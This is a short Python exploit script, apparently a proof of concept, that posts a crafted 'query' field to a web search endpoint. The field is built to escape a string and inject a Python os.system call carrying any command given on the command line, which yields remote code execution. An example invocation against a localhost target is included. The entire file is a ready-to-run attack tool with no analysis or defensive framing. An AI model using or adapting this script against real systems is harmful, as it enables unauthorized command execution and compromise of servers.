import requests
import sys

if len(sys.argv) != 3:
    print("Usage: python3 exploit.py <url> <command>")
    sys.exit(1)
url = sys.argv[1]
command = sys.argv[2]
code=f"}}')(__import__('os').system('{command}'))#"
data=f"engine=Amazon&query={code}"
headers = {'Content-Type': 'application/x-www-form-urlencoded'}
r=requests.post(url,data=data,headers=headers)
print(r.text)

# Example: python3 exploit.py http://localhost:5000/search ls
